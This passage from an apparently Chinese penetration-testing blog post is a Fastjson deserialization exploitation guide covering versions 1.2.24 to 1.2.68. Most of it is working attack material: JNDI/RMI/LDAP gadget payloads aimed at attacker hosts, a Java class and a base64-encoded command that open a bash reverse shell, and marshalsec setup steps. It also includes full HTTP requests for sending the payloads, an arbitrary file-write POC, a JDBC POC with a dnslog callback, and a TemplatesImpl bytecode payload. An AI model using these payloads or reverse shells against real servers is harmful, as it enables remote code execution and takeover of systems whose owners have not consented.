<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<h2 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h2><p>前提条件：需要目标服务端存在<code>mybatis</code>的jar包，且版本需为<code>3.x.x</code>系列<code>&lt;3.5.0</code>的版本。 使用黑名单绕过，<code>org.apache.ibatis.datasource</code>在<code>1.2.46</code>版本被加入了黑名单 由于在项目中使用的频率也较高，所以影响范围较大。</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<h2 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h2><p>对版本小于1.2.48的版本通杀，<code>autoType</code>为关闭状态也可使用。 <code>loadClass</code>中默认<code>cache</code>设置为<code>true</code>，</p>
<p>(1)首先使用<code>java.lang.Class</code>把获取到的类缓存到<code>mapping</code>中，</p>
<p>(2)直接从缓存中获取到了<code>com.sun.rowset.JdbcRowSetImpl</code>这个类，绕过了黑名单机制。</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h2><p>基于黑名单绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,</span><br><span class="line">  <span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span></span><br><span class="line">&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<h2 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h2><p>关于fastjson&lt;=1.2.66网上相关的利用不多,收集到的几个exp，也是基于黑名单绕过。</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">  <span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click">https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<h1 id="0x03-Fastjson-漏洞利用方式"><a href="#0x03-Fastjson-漏洞利用方式" class="headerlink" title="0x03 Fastjson 漏洞利用方式"></a>0x03 Fastjson 漏洞利用方式</h1><p>编写EXP-&gt;启动python服务器-&gt;启动rmi 监听-&gt; 发送poc-&gt;成功反弹shell</p>
<p>需要 Java 环境</p>
<h3 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h3><p>将代码编写为class类文件，并将生成的类文件放在web目录下，并启动web服务</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
<p>EXP编码 <code>bash -c &#123;echo,YmFzaCAtaSA+JiAgL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);<span class="comment">//需要进行 base64 编码</span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译 EXP 并启动 python 服务器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">javac Exploit.java</span><br><span class="line"><span class="comment"># python 服务</span></span><br><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure>

<h3 id="配置RMI环境"><a href="#配置RMI环境" class="headerlink" title="配置RMI环境"></a>配置RMI环境</h3><p>用marshalsec项目，启动一个RMI服务器，监听9999端口，并加载远程类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/mbechler/marshalsec.git</span></span><br><span class="line">cd marshalsec/</span><br><span class="line">mvn install</span><br><span class="line">mvn clean <span class="keyword">package</span> –DskipTests</span><br><span class="line">cd target/</span><br></pre></td></tr></table></figure>

<h3 id="启动RMI服务监听"><a href="#启动RMI服务监听" class="headerlink" title="启动RMI服务监听"></a>启动RMI服务监听</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://1.1.1.1:8888/#Exploit&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p>备注：<a target="_blank" rel="noopener external nofollow noreferrer" href="http://xx.xx.xx.xx:9999/#POC">http://xx.xx.xx.xx:9999/#POC</a> 是放Java类的地址，类只要写名字即可，不需要加.class，其次类名前要加#</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>把网站json数据包替换，然后发包，VPS即可收到</p>
<p>这里的EXP 根据Fastjson 版本不同，进行替换</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;a&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span></span><br><span class="line"><span class="comment">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    &quot;b&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="comment">        &quot;dataSourceName&quot;:&quot;rmi://2.2.2.2:9999/Exploit&quot;,</span></span><br><span class="line"><span class="comment">        &quot;autoCommit&quot;:true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x04-各个版本利用"><a href="#0x04-各个版本利用" class="headerlink" title="0x04 各个版本利用"></a>0x04 各个版本利用</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson 1.2.24"></a>fastjson 1.2.24</h2><p>如果弹shell 需要先搭建 rmi 服务器</p>
<p>将<code>127.0.0.1</code> 换成rmi服务器地址 <code>8653</code> 为rmi 服务器端口</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>you-ip:port</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;b&quot;</span>:&#123;</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="json">    &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h2><p>如果弹shell 需要先搭建 rmi 服务器</p>
<p>将<code>127.0.0.1</code> 换成rmi服务器地址 <code>8653</code> 为rmi 服务器端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: you-ip:port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">158</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastjson burp 插件</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/zilong3033/fastjsonScan">https://github.com/zilong3033/fastjsonScan</a></p>
<h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>在Fastjson&lt;=1.2.68的版本中，通过新的Gadgets绕过autoType开关，在autoType关闭的情况下仍然可以绕过黑白名单防御机制，通过反序列化漏洞在服务器上执行任意代码</p>
<p>Fastjson爆出的绕过方法可以通杀 1.2.68 以下所有版本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fastjson &lt;= <span class="number">1.2</span><span class="number">.68</span></span><br></pre></td></tr></table></figure>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>任意文件写入POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar&quot;</span>,<span class="string">&quot;append&quot;</span>:<span class="keyword">false</span>&#125;,<span class="string">&quot;infl&quot;</span>:&#123;<span class="string">&quot;input&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span>&#125;,<span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.nio.charset.Charset&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;500&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>JDBC反序列化POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="string">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;portToConnectTo&quot;</span>:<span class="number">3306</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;info&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;PORT&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;</span>,<span class="string">&quot;PORT.1&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;HOST.1&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;NUM_HOSTS&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;HOST&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;DBNAME&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x05-Fastjson不出网利用"><a href="#0x05-Fastjson不出网利用" class="headerlink" title="0x05 Fastjson不出网利用"></a>0x05 Fastjson不出网利用</h1><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
<p>1.<strong>服务器出网</strong></p>
<p>使用<code>jndi</code>注入-<code>ldap -</code>rmi</p>
<p>2.<strong>服务器不能出网</strong></p>
<ul>
<li>直接本地反序列化</li>
<li><code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</li>
<li><code>TemplatesImpl</code>  不常用</li>
</ul>
<h2 id="反序列化-bytecodes直接反序列化Poc-TemplatesImpl"><a href="#反序列化-bytecodes直接反序列化Poc-TemplatesImpl" class="headerlink" title="反序列化-_bytecodes直接反序列化Poc  TemplatesImpl"></a><strong>反序列化-_bytecodes直接反序列化Poc</strong>  <code>TemplatesImpl</code></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl</span><br></pre></td></tr></table></figure>

<p>由于解析json需要额外添加参数Feature，因此实际情况可能不会遇到，这里只是做个记录。首先需要准备一个Poc：</p>
<p>创建<code>Poc.java</code> 代码如下 <code>exec</code> 为payload，使用低版本Java 执行最好是jdk8 以下的，<code>javac Poc.java</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().<span class="built_in">exec</span>(new String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t = new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>new String[] 是以数组的方式传送，能执行多个命令，如果不加会报错。</p>
<p>在使用 python生成字节码</p>
<p>python <a target="_blank" rel="noopener external nofollow noreferrer" href="http://fast.py/">fast.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin = open(r<span class="string">&quot;Poc.class&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">fout = open(r<span class="string">&quot;en1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<p>将生成的字节码放入<code> poc.class_base64</code></p>
<p>1.2.24 payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123;&#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.47 payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>: <span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>: &#123;&#125;,<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;b&quot;</span>,        <span class="string">&quot;_version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

